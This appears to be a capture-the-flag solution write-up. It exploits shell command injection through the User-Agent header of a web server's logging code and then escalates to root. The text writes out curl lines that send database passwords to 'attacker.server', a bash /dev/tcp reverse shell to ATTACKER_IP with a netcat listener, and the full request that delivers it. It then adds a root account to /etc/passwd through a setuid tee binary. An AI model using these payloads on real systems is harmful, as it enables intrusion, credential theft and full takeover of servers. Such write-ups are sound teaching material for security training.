# Solution

While `log_message.replace('"', '\\"')` prevents attacks in the form of

    User-Agent: "; curl http://attacker.server/$DB_PASSOWRD/$DBPASSWORD

it does not prevent spawning of subshells. So, what an attacker could do is:

    User-Agent: $(curl http://attacker.server/$DB_PASSOWRD/$DBPASSWORD)

or

    User-Agent: `curl http://attacker.server/$DB_PASSOWRD/$DBPASSWORD`

We can then use this to spawn a reverse shell with the help of bash. We specify `/bin/bash -c 'command'`, because out of the most built-in shells, only bash can handle the pseudofile `/dev/tcp`.

So, the header is:

    User-Agent: $(/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/LPORT 0>&1')

In another terminal we start a netcat listener:

```bash
  $ nc -l -vv -p $LPORT
```

Using `curl` we can send the request to the server:

```bash
  $ curl --insecure -A "\`/bin/bash -c '/bin/bash -i >& /dev/tcp/$ATTACKER_IP/$LPORT 0>&1'\`" https://SERVERADDRESS/
```

Going back to the netcat terminal, we see that we now have a shell.

A script that automates this process is available.

Unfortunately, checking the output of `id`, we are not running as root. The work is not done!

## Privilege escalation

We try our luck with finding binaries with the `setuid` bit set:

```shell
  $ find / -perm -u=s -type f 2>/dev/null
```

An unusual entry appears - `/usr/bin/tee`. This means that we are able to write to any read-only file on the system. Such file of interest is `/etc/passwd`, where user account information is stored. More importantly, we can add a new root user account by appending a correctly formatted line to the file.

We generate a new account by:

1. We get a hashed password `baddevs` for the password file with openssl:

    ```shell
      $ openssl passwd -1 -salt NaCl baddevs
    ```

2. We add a new root user account `badpractices` by `echo`ing and piping to `tee -a /etc/passwd`:

    ```shell
      $ echo 'badpractices:$1$NaCl$EQJvHZYer2J3/8py1YA2m1:0:0:root:/root:/bin/bash' | tee -a /etc/passwd
    ```

We can switch to the new account with `su badpractices -` and entering `baddevs` as the password. We have full control of the web server system, so it's time to have fun!
